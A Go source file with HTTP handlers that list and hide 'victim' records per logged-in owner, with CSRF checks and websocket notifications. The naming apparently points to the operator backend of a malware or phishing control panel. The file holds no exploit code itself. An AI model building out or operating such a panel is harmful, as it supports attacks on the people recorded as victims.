package httpapi

import (
	"net/http"
	"strconv"
	"strings"
)

func (s *Server) handleGetVictims(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	owner := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if owner == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	limit := 500
	offset := 0
	if r != nil {
		if v := strings.TrimSpace(r.URL.Query().Get("limit")); v != "" {
			if n, err := strconv.Atoi(v); err == nil {
				if n > 0 {
					limit = n
				}
			}
		}
		if v := strings.TrimSpace(r.URL.Query().Get("offset")); v != "" {
			if n, err := strconv.Atoi(v); err == nil {
				if n >= 0 {
					offset = n
				}
			}
		}
	}
	if limit > 2000 {
		limit = 2000
	}

	list, err := s.db.ListVictimsForOwner(owner, limit, offset)
	if err != nil {
		http.Error(w, "victims error", http.StatusInternalServerError)
		return
	}

	s.writeJSON(w, http.StatusOK, list)
}

func (s *Server) handleDeleteVictim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete && r.Method != http.MethodPost {
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}

	if !s.checkCSRF(w, r) {
		s.writeJSON(w, http.StatusForbidden, map[string]string{"error": "security_check_failed"})
		return
	}

	owner := strings.ToLower(strings.TrimSpace(loginFromContext(r)))
	if owner == "" {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	id := ""
	if r != nil {
		id = strings.TrimSpace(r.URL.Query().Get("id"))
	}
	if id == "" {
		http.Error(w, "id is required", http.StatusBadRequest)
		return
	}
	dbOwner, ok, err := s.db.GetVictimOwnerByID(id)
	if err != nil {
		http.Error(w, "delete error", http.StatusInternalServerError)
		return
	}
	if !ok || strings.ToLower(strings.TrimSpace(dbOwner)) != owner {
		w.WriteHeader(http.StatusNotFound)
		return
	}

	if err := s.db.HideVictimForOwner(owner, id); err != nil {
		http.Error(w, "delete error", http.StatusInternalServerError)
		return
	}

	if s.wsHub != nil {
		s.wsHub.HideVictim(owner, id)
	}

	w.WriteHeader(http.StatusNoContent)
}
